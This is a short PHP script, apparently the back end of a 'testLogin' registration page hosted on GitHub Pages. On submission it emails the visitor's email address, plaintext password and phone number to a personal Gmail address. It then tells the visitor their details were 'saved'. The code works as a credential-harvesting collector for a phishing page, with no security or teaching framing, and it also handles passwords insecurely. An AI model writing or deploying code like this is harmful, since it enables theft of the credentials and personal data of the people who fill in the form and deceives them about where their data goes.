<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // replace with your email address
    $to = 'ermalcoka1@gmail.com';

    $subject = 'New Registration';
    $message = 'Email: ' . $_POST['email'] . "\n" .
               'Password: ' . $_POST['password'] . "\n" .
               'Phone: ' . $_POST['phone'] . ' ' . $_POST['phone-number'] . "\n";
    $headers = 'From: https://malitik.github.io/testLogin/' . "\r\n" .
               'Reply-To: https://malitik.github.io/testLogin/' . "\r\n" .
               'X-Mailer: PHP/' . phpversion();

    if (mail($to, $subject, $message, $headers)) {
        echo '<p>Thank you for registering. Your details have been saved.</p>';
    } else {
        echo '<p>Sorry, there was an error sending your registration details. Please try again later.</p>';
    }
}
?>
